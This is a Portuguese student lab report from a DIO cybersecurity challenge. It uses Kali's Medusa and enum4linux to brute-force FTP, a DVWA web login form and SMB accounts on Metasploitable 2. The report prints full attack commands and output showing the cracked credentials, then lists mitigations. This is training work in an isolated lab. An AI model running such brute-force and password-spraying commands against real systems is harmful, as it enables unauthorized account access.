Desafio de Projeto DIO: Brute Force com 
Kali e Medusa 
Este é o meu projeto do desafio de cibersegurança da DIO. O objetivo era usar o Kali Linux e o 
Medusa para simular ataques de força bruta em um laboratório virtual. 
1. Ambiente do Laboratório 
● Virtualizador: VirtualBox 
● Rede: Host-Only (rede interna) 
● Atacante: Kali Linux 
● Alvos: Metasploitable 2 e DVWA 
2. Ataques Realizados 
Aqui estão os testes que eu fiz. 
Cenário 1: Ataque FTP (no Metasploitable 2) 
● Alvo: 192.168.56.102 
● Listas: user.txt e senhas.txt 
Comando: 
medusa -h 192.168.56.102 -U user.txt -P senhas.txt -M ftp 
 
Resultado (Funcionou!): 
┌──(kalig㉿kali)-[~] 
└─$ medusa -h 192.168.56.102 -U user.txt -P senhas.txt -M ftp 
Medusa v2.3 [[http://www.foofus.net](http://www.foofus.net)] (C) JoMo-Kun / Foofus Networks 
<jmk@foofus.net> 
 
2025-10-24 23:19:10 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 comp 
... 
2025-10-24 23:19:25 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin 
Password: msfadmin [SUCCESS] 
... 
2025-10-24 23:19:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 comp 
lete) User: user (3 of 3, 2 complete) Password: msfadmin (4 of 4 complete) 
 

Cenário 2: Ataque de Formulário Web (no DVWA) 
● Alvo: 192.168.56.102 
● Nível: Low 
Comando: 
medusa -h 192.168.56.102 -U user.txt -P senhas.txt -M web-form \ 
-m FORM_TARGET:"/dvwa/vulnerabilities/brute/index.php" \ 
-m FORM_DATA:"username=%USER%&password=%PASS%&Login=Login" \ 
-m FORM_FAIL:"Username and/or password incorrect." \ 
-m PAGE_LOGIN_PATH:"/dvwa/login.php" \ 
-m PAGE_LOGIN_DATA:"username=admin&password=password&Login=Login" 
 
Resultado (Funcionou também): 
Medusa v2.3 [[http://www.foofus.net](http://www.foofus.net)] (C) JoMo-Kun / Foofus Networks 
<jmk@foofus.net> 
 
WARNING: Invalid method: FORM_TARGET. 
... 
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: msfadmin 
Password: admin [SUCCESS] 
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin 
Password: admin [SUCCESS] 
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: user 
Password: admin [SUCCESS] 
 
Cenário 3: Password Spraying em SMB (no Metasploitable 2) 
● Alvo: 192.168.56.102 
● Técnica: Testar uma senha (msfadmin) em vários usuários. 
Enumeração de Usuários (com enum4linux): 
enum4linux -U 192.168.56.102 
 
s====================================( Users on 192.168.56.102 
)======================================  
... 
user:[user] rid:[0xbba] 
user:[root] rid:[0x3e8] 
user:[msfadmin] rid:[0xbb8] 

... 
enum4linux complete on Fri Oct 24 23:22:32 2025 
 
Comando (Password Spraying): 
medusa -h 192.168.56.102 -U user.txt -p 'msfadmin' -M smbnt 
 
Resultado (Achou o admin!): 
┌──(kalig㿿kali)-[~] 
└─$ medusa -h 192.168.56.102 -U user.txt -p 'msfadmin' -M smbnt 
Medusa v2.3 [[http://www.foofus.net](http://www.foofus.net)] (C) JoMo-Kun / Foofus Networks 
<jmk@foofus.net> 
 
2025-10-24 23:26:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) 
User: msfadmin (1 of 3, 0 complete) Password: msfadmin (1 of 1 complete) 
2025-10-24 23:26:31 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin 
Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)] 
2025-10-24 23:26:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) 
User: admin (2 of 3, 1 complete) Password: msfadmin (1 of 1 complete) 
2025-10-24 23:26:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) 
User: user (3 of 3, 2 complete) Password: msfadmin (1 of 1 complete) 
 
3. Como se Proteger (Mitigação) 
Depois de ver como é fácil atacar, aqui estão as formas de se defender: 
1. Usar senhas fortes e complexas. 
2. Bloquear contas depois de X tentativas erradas. 
3. Usar "Rate Limiting" (atraso entre tentativas). 
4. Usar Autenticação Multifator (MFA). 
5. Monitorar logs para tentativas de login estranhas. 
6. Desligar serviços que não estão sendo usados (como FTP ou SMB). 
4. Aviso Legal 
Fiz todos esses testes em um ambiente virtual e controlado (Metasploitable 2 e DVWA), só 
para aprender. Nenhum sistema real foi atacado. 

